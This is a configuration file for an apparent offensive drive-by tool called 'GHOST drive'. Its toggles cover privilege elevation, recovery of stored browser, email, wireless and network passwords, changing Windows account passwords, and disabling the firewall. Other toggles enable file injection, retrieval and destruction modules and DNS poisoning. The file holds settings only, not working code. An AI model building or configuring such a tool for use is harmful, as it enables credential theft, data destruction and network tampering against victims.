# Reference in the "cheat sheat.rtf" file

# ->initializing controls
exec_mode = "normal"
uac_elevation = 1
duplicate_exec = 1
multi_arch = 1

# ->completion controls
msgbox = {
    'controller': 1,
    'title': "GHOST drive",
    'msg': "Driveby complete",
    'buttons': 0
}
power = {
    'controller': 0,
    'mode': "s",
    'comment': "a message",
    'timeout': "999"
}

# ->password recovery
browser_pwds = 0
wireless_keys = 0
email_pst_pwds = 0
mail_pwds = 0
network_pwds = 0
msn_pwds = 0
dialup_pwds = 0

# ->password moding
change_nt_pwd = {
    'current_acc_controller': 0,
    'current_acc_pwd': "new password",
    'diff_acc_controller': 0,
    'diff_acc_usr': "Ebrahim",
    'diff_acc_pwd': "a password"
}

# ->recon
batch_info = 1
network_scan = 0

# ->network based executions
deactivate_firewall = 0
activate_firewall = 0
release_net_adapters = 0
renew_net_adapters = 0
flush_dns = 0
register_dns = 0

# ->file utilities
injector = {
    'controller': 1,
    'path': ""
}
retriever = {
    'controller': 1,
    'path': ""
}
destroyer = {
    'controller': 1,
    'path': ""
}

# ->custom executions
local_exec = 1
target_exec = {
    'controller': 1,
    'path': ""
}

# ->DNS poisoning
dns_poison = {
    'controller': 1,
    'entries': "" # research array inside an array
}